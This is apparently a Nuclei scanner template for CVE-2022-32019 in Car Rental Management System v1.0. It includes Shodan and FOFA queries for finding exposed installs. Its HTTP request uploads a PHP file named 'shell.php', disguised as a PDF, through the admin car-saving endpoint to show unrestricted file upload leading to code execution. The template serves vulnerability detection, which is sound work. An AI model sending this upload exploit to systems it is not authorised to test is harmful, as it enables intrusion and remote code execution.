id: CVE-2022-32019

info:
  name: Car Rental Management System v1.0 Arbitrary Code Execution
  author: ProjectDiscoveryAI
  severity: critical
  description: Car Rental Management System v1.0 is vulnerable to arbitrary code execution via the admin panel file upload functionality.
  impact: |
    Successful exploitation could allow an attacker to execute arbitrary code on the system.
  remediation: |
    Apply the vendor-supplied patch or update to the latest version to mitigate CVE-2022-32019.
  reference:
    - https://github.com/k0xx11/bug_report/blob/main/vendors/campcodes.com/car-rental-management-system/RCE-1.md
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-32019
    cwe-id: CWE-434
    epss-score: 0.00298
    epss-percentile: 0.70189
    cpe: cpe:2.3:a:car_rental_management_system_project:car_rental_management_system:1.0:*:*:*:*:*:*:*
  metadata:
    vendor: car_rental_management_system_project
    product: car_rental_management_system
    shodan-query: http.html:"Car Rental Management System"
    fofa-query: body="car rental management system"

http:
  - method: POST
    path:
      - "{{BaseURL}}/car-rental-management-system/admin/ajax.php?action=save_car"

    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
      Accept: "*/*"
      Accept-Language: "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"
      Accept-Encoding: "gzip, deflate"
      DNT: "1"
      X-Requested-With: "XMLHttpRequest"
      Referer: "{{BaseURL}}/car-rental-management-system/admin/index.php?page=manage_car&id=6"
      Content-Type: "multipart/form-data; boundary=---------------------------16501296121152"
      Cookie: "PHPSESSID=q0aiu0hqk51vrl4kivubc7u18k"
      Connection: "close"

    body: |
      -----------------------------16501296121152
      Content-Disposition: form-data; name="id"

      6
      -----------------------------16501296121152
      Content-Disposition: form-data; name="brand"

      1
      -----------------------------16501296121152
      Content-Disposition: form-data; name="model"

      1
      -----------------------------16501296121152
      Content-Disposition: form-data; name="category_id"

      6
      -----------------------------16501296121152
      Content-Disposition: form-data; name="engine_id"

      3
      -----------------------------16501296121152
      Content-Disposition: form-data; name="transmission_id"

      3
      -----------------------------16501296121152
      Content-Disposition: form-data; name="description"

      111
      -----------------------------16501296121152
      Content-Disposition: form-data; name="price"

      10
      -----------------------------16501296121152
      Content-Disposition: form-data; name="qty"

      110
      -----------------------------16501296121152
      Content-Disposition: form-data; name="img"; filename="shell.php"
      Content-Type: application/pdf

      <?php phpinfo(); ?>
      -----------------------------16501296121152--
    matchers:
      - type: word
        words:
          - "shell.php"
        part: body
